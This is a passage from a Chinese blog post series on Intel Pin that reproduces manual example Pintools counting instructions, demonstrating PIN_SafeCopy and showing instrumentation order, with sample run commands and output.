class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// ==================================================================</span></div><div class=\"line\"><span class=\"comment\">// Global variables</span></div><div class=\"line\"><span class=\"comment\">// ==================================================================</span></div><div class=\"line\"></div><div class=\"line\">UINT64 insNativeDiscoveredCount = <span class=\"number\">0</span>;  <span class=\"comment\">//number of discovered native instructions</span></div><div class=\"line\">UINT64 insDynamicDiscoveredCount = <span class=\"number\">0</span>; <span class=\"comment\">//number of discovered dynamic instructions</span></div><div class=\"line\">UINT64 insNoRtnDiscoveredCount = <span class=\"number\">0</span>;   <span class=\"comment\">//number of discovered instructions without any known routine</span></div><div class=\"line\"></div><div class=\"line\">UINT64 insNativeExecutedCount = <span class=\"number\">0</span>;  <span class=\"comment\">//number of executed native instructions</span></div><div class=\"line\">UINT64 insDynamicExecutedCount = <span class=\"number\">0</span>; <span class=\"comment\">//number of executed dynamic instructions</span></div><div class=\"line\">UINT64 insNoRtnExecutedCount = <span class=\"number\">0</span>;   <span class=\"comment\">//number of executed instructions without any known routine</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">std</span>::ostream * out = &amp;<span class=\"built_in\">cerr</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// =====================================================================</span></div><div class=\"line\"><span class=\"comment\">// Command line switches</span></div><div class=\"line\"><span class=\"comment\">// =====================================================================</span></div><div class=\"line\"></div><div class=\"line\">KNOB&lt;<span class=\"built_in\">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE,  <span class=\"string\">\"pintool\"</span>, <span class=\"string\">\"o\"</span>, <span class=\"string\">\"\"</span>, <span class=\"string\">\"specify file name for output\"</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// =====================================================================</span></div><div class=\"line\"><span class=\"comment\">// Utilities</span></div><div class=\"line\"><span class=\"comment\">// =====================================================================</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Print out help message.</span></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This tool prints out the number of native and dynamic instructions\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// =====================================================================</span></div><div class=\"line\"><span class=\"comment\">// Analysis routines</span></div><div class=\"line\"><span class=\"comment\">// =====================================================================</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called before every native instruction is executed</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">InsNativeCount</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    ++insNativeExecutedCount;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called before every dynamic instruction is executed</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">InsDynamicCount</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    ++insDynamicExecutedCount;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called before every instruction without any known routine is executed</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">InsNoRtnCount</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    ++insNoRtnExecutedCount;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// =====================================================================</span></div><div class=\"line\"><span class=\"comment\">// Instrumentation callbacks</span></div><div class=\"line\"><span class=\"comment\">// =====================================================================</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Pin calls this function every time a new instruction is encountered</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Instruction</span><span class=\"params\">(INS ins, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    RTN rtn = INS_Rtn(ins);</div><div class=\"line\">    <span class=\"keyword\">if</span> (!RTN_Valid(rtn))</div><div class=\"line\">    &#123;</div><div class=\"line\">        ++insNoRtnDiscoveredCount;</div><div class=\"line\">        INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)InsNoRtnCount, IARG_END);</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (RTN_IsDynamic(rtn))</div><div class=\"line\">    &#123;</div><div class=\"line\">        ++insDynamicDiscoveredCount;</div><div class=\"line\">        INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)InsDynamicCount, IARG_END);</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">else</span></div><div class=\"line\">    &#123;</div><div class=\"line\">        ++insNativeDiscoveredCount;</div><div class=\"line\">        INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)InsNativeCount, IARG_END);</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Print out analysis results.</span></div><div class=\"line\"><span class=\"comment\">// This function is called when the application exits.</span></div><div class=\"line\"><span class=\"comment\">// @param[in]   code            exit code of the application</span></div><div class=\"line\"><span class=\"comment\">// @param[in]   v               value specified by the tool in the</span></div><div class=\"line\"><span class=\"comment\">//                              PIN_AddFiniFunction function call</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    *out &lt;&lt;  <span class=\"string\">\"===============================================\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    *out &lt;&lt;  <span class=\"string\">\"Number of executed native instructions: \"</span> &lt;&lt; insNativeExecutedCount &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    *out &lt;&lt;  <span class=\"string\">\"Number of executed dynamic instructions: \"</span> &lt;&lt; insDynamicExecutedCount &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    *out &lt;&lt;  <span class=\"string\">\"Number of executed instructions without any known routine: \"</span> &lt;&lt; insNoRtnExecutedCount &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    *out &lt;&lt;  <span class=\"string\">\"===============================================\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    *out &lt;&lt;  <span class=\"string\">\"Number of discovered native instructions: \"</span> &lt;&lt; insNativeDiscoveredCount &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    *out &lt;&lt;  <span class=\"string\">\"Number of discovered dynamic instructions: \"</span> &lt;&lt; insDynamicDiscoveredCount &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    *out &lt;&lt;  <span class=\"string\">\"Number of discovered instructions without any known routine: \"</span> &lt;&lt; insNoRtnDiscoveredCount &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    *out &lt;&lt;  <span class=\"string\">\"===============================================\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"built_in\">string</span> fileName = KnobOutputFile.Value();</div><div class=\"line\">    <span class=\"keyword\">if</span> (!fileName.empty())</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">delete</span> out;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// The main procedure of the tool.</span></div><div class=\"line\"><span class=\"comment\">// This function is called when the application image is loaded but not yet started.</span></div><div class=\"line\"><span class=\"comment\">// @param[in]   argc            total number of elements in the argv array</span></div><div class=\"line\"><span class=\"comment\">// @param[in]   argv            array of command line arguments,</span></div><div class=\"line\"><span class=\"comment\">//                              including pin -t &lt;toolname&gt; -- ...</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize symbol processing</span></div><div class=\"line\">    PIN_InitSymbols();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Initialize PIN library. Print help message if -h(elp) is specified</span></div><div class=\"line\">    <span class=\"comment\">// in the command line or the command line is invalid</span></div><div class=\"line\">    <span class=\"keyword\">if</span>(PIN_Init(argc,argv))</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">return</span> Usage();</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"built_in\">string</span> fileName = KnobOutputFile.Value();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> (!fileName.empty())</div><div class=\"line\">    &#123;</div><div class=\"line\">        out = <span class=\"keyword\">new</span> <span class=\"built_in\">std</span>::ofstream(fileName.c_str());</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Instruction to be called to instrument instructions</span></div><div class=\"line\">    INS_AddInstrumentFunction(Instruction, <span class=\"literal\">NULL</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register function to be called when the application exits</span></div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"literal\">NULL</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Start the program, never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/\" target=\"_blank\" rel=\"external\">Pin 用户手册</a></p>\n"},{"title":"Intel Pin 2 ：示例（再续）","url":"http://huirong.github.io/2016/01/08/Intel-Pin-example3/","content":"<p>继续Intel Pin示例系列。<br><a id=\"more\"></a></p>\n<h1 id=\"Using-PIN-SafeCopy\"><a href=\"#Using-PIN-SafeCopy\" class=\"headerlink\" title=\"Using PIN_SafeCopy()\"></a>Using PIN_SafeCopy()</h1><p>PIN_SafeCopy()将指定字节数从源内存区拷贝到目的内存区，此函数确保安全返回，即使源或目的内存区不可访问（部分或全部）。</p>\n<p>PIN_SafeCopy()还确保应用程序的安全读写。如，在Windows中，运行分析代码时，Pin替换掉特定TEB块，若Pin tool 直接访问此块，则访问到的是修改后的值，而不是原始值。</p>\n<p>我们推荐使用此API读写应用程序内存。<br><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ../../../pin -t obj-ia32/safecopy.so <span class=\"comment\">-- /bin/cp makefile obj-ia32/safecopy.so.makefile.copy</span></div><div class=\"line\">$ head safecopy.out</div><div class=\"line\">Emulate loading <span class=\"keyword\">from</span> addr <span class=\"number\">0xbff0057c</span> <span class=\"keyword\">to</span> ebx</div><div class=\"line\">Emulate loading <span class=\"keyword\">from</span> addr <span class=\"number\">0x64ffd4</span> <span class=\"keyword\">to</span> eax</div><div class=\"line\">Emulate loading <span class=\"keyword\">from</span> addr <span class=\"number\">0xbff00598</span> <span class=\"keyword\">to</span> esi</div><div class=\"line\">Emulate loading <span class=\"keyword\">from</span> addr <span class=\"number\">0x6501c8</span> <span class=\"keyword\">to</span> edi</div><div class=\"line\">Emulate loading <span class=\"keyword\">from</span> addr <span class=\"number\">0x64ff14</span> <span class=\"keyword\">to</span> edx</div><div class=\"line\">Emulate loading <span class=\"keyword\">from</span> addr <span class=\"number\">0x64ff1c</span> <span class=\"keyword\">to</span> edx</div><div class=\"line\">Emulate loading <span class=\"keyword\">from</span> addr <span class=\"number\">0x64ff24</span> <span class=\"keyword\">to</span> edx</div><div class=\"line\">Emulate loading <span class=\"keyword\">from</span> addr <span class=\"number\">0x64ff2c</span> <span class=\"keyword\">to</span> edx</div><div class=\"line\">Emulate loading <span class=\"keyword\">from</span> addr <span class=\"number\">0x64ff34</span> <span class=\"keyword\">to</span> edx</div><div class=\"line\">Emulate loading <span class=\"keyword\">from</span> addr <span class=\"number\">0x64ff3c</span> <span class=\"keyword\">to</span> edx</div></pre></td></tr></table></figure></p>\n<p>源码在 source/tools/ManualExamples/safecopy.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin_isa.H\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">std</span>::ofstream* out = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//=======================================================</span></div><div class=\"line\"><span class=\"comment\">//  Analysis routines</span></div><div class=\"line\"><span class=\"comment\">//=======================================================</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Move from memory to register</span></div><div class=\"line\"><span class=\"function\">ADDRINT <span class=\"title\">DoLoad</span><span class=\"params\">(REG reg, ADDRINT * addr)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    *out &lt;&lt; <span class=\"string\">\"Emulate loading from addr \"</span> &lt;&lt; addr &lt;&lt; <span class=\"string\">\" to \"</span> &lt;&lt; REG_StringShort(reg) &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    ADDRINT value;</div><div class=\"line\">    PIN_SafeCopy(&amp;value, addr, <span class=\"keyword\">sizeof</span>(ADDRINT));</div><div class=\"line\">    <span class=\"keyword\">return</span> value;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//=======================================================</span></div><div class=\"line\"><span class=\"comment\">// Instrumentation routines</span></div><div class=\"line\"><span class=\"comment\">//=======================================================</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">EmulateLoad</span><span class=\"params\">(INS ins, VOID* v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Find the instructions that move a value from memory to a register</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (INS_Opcode(ins) == XED_ICLASS_MOV &amp;&amp;</div><div class=\"line\">        INS_IsMemoryRead(ins) &amp;&amp; </div><div class=\"line\">        INS_OperandIsReg(ins, <span class=\"number\">0</span>) &amp;&amp;</div><div class=\"line\">        INS_OperandIsMemory(ins, <span class=\"number\">1</span>))</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"comment\">// op0 &lt;- *op1</span></div><div class=\"line\">        INS_InsertCall(ins,</div><div class=\"line\">                       IPOINT_BEFORE,</div><div class=\"line\">                       AFUNPTR(DoLoad),</div><div class=\"line\">                       IARG_UINT32,</div><div class=\"line\">                       REG(INS_OperandReg(ins, <span class=\"number\">0</span>)),</div><div class=\"line\">                       IARG_MEMORYREAD_EA,</div><div class=\"line\">                       IARG_RETURN_REGS,</div><div class=\"line\">                       INS_OperandReg(ins, <span class=\"number\">0</span>),</div><div class=\"line\">                       IARG_END);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// Delete the instruction</span></div><div class=\"line\">        INS_Delete(ins);</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This tool demonstrates the use of SafeCopy\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> * argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Write to a file since cout and cerr maybe closed by the application</span></div><div class=\"line\">    out = <span class=\"keyword\">new</span> <span class=\"built_in\">std</span>::ofstream(<span class=\"string\">\"safecopy.out\"</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Initialize pin &amp; symbol manager</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\">    PIN_InitSymbols();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register EmulateLoad to be called to instrument instructions</span></div><div class=\"line\">    INS_AddInstrumentFunction(EmulateLoad, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Never returns</span></div><div class=\"line\">    PIN_StartProgram();   </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"Order-of-Instrumentation\"><a href=\"#Order-of-Instrumentation\" class=\"headerlink\" title=\"Order of Instrumentation\"></a>Order of Instrumentation</h1><p>Pin提供多种方法控制分析函数的执行顺序，可以通过插入操作（IPOINT）和调用顺序函数（CALL_ORDER）实现。<br>下例展示了，用三种不同的方式插装所有的返回指令。另一个例子可参见 source/tools/InstrumentationOrderAndVersion.</p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">../../../pin -t obj-ia32/invocation.so <span class=\"comment\">-- obj-ia32/little_malloc</span></div><div class=\"line\">head invocation.<span class=\"keyword\">out</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ezrwrmrpt8j30k509kzlc.jpg\" alt=\"\"></p>\n<p>源码参见 source/tools/ManualExamples/invocation.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">KNOB&lt;<span class=\"built_in\">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class=\"string\">\"pintool\"</span>,</div><div class=\"line\">    <span class=\"string\">\"o\"</span>, <span class=\"string\">\"invocation.out\"</span>, <span class=\"string\">\"specify output file name\"</span>);</div><div class=\"line\"></div><div class=\"line\">ofstream OutFile;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * Analysis routines</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Taken</span><span class=\"params\">( <span class=\"keyword\">const</span> CONTEXT * ctxt)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    ADDRINT TakenIP = (ADDRINT)PIN_GetContextReg( ctxt, REG_INST_PTR );</div><div class=\"line\">    OutFile &lt;&lt; <span class=\"string\">\"Taken: IP = \"</span> &lt;&lt; hex &lt;&lt; TakenIP &lt;&lt; dec &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Before</span><span class=\"params\">(CONTEXT * ctxt)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    ADDRINT BeforeIP = (ADDRINT)PIN_GetContextReg( ctxt, REG_INST_PTR);</div><div class=\"line\">    OutFile &lt;&lt; <span class=\"string\">\"Before: IP = \"</span> &lt;&lt; hex &lt;&lt; BeforeIP &lt;&lt; dec &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">After</span><span class=\"params\">(CONTEXT * ctxt)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    ADDRINT AfterIP = (ADDRINT)PIN_GetContextReg( ctxt, REG_INST_PTR);</div><div class=\"line\">    OutFile &lt;&lt; <span class=\"string\">\"After: IP = \"</span> &lt;&lt; hex &lt;&lt; AfterIP &lt;&lt; dec &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">    </div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * Instrumentation routines</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ImageLoad</span><span class=\"params\">(IMG img, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">for</span> (SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec))</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"comment\">// RTN_InsertCall() and INS_InsertCall() are executed in order of</span></div><div class=\"line\">        <span class=\"comment\">// appearance.  In the code sequence below, the IPOINT_AFTER is</span></div><div class=\"line\">        <span class=\"comment\">// executed before the IPOINT_BEFORE.</span></div><div class=\"line\">        <span class=\"keyword\">for</span> (RTN rtn = SEC_RtnHead(sec); RTN_Valid(rtn); rtn = RTN_Next(rtn))</div><div class=\"line\">        &#123;</div><div class=\"line\">            <span class=\"comment\">// Open the RTN.</span></div><div class=\"line\">            RTN_Open( rtn );</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\">// IPOINT_AFTER is implemented by instrumenting each return</span></div><div class=\"line\">            <span class=\"comment\">// instruction in a routine.  Pin tries to find all return</span></div><div class=\"line\">            <span class=\"comment\">// instructions, but success is not guaranteed.</span></div><div class=\"line\">            RTN_InsertCall( rtn, IPOINT_AFTER, (AFUNPTR)After,</div><div class=\"line\">                            IARG_CONTEXT, IARG_END);</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\">// Examine each instruction in the routine.</span></div><div class=\"line\">            <span class=\"keyword\">for</span>( INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins) )</div><div class=\"line\">            &#123;</div><div class=\"line\">                <span class=\"keyword\">if</span>( INS_IsRet(ins) )</div><div class=\"line\">                &#123;</div><div class=\"line\">                    <span class=\"comment\">// instrument each return instruction.</span></div><div class=\"line\">                    <span class=\"comment\">// IPOINT_TAKEN_BRANCH always occurs last.</span></div><div class=\"line\">                    INS_InsertCall( ins, IPOINT_BEFORE, (AFUNPTR)Before,</div><div class=\"line\">                                   IARG_CONTEXT, IARG_END);</div><div class=\"line\">                    INS_InsertCall( ins, 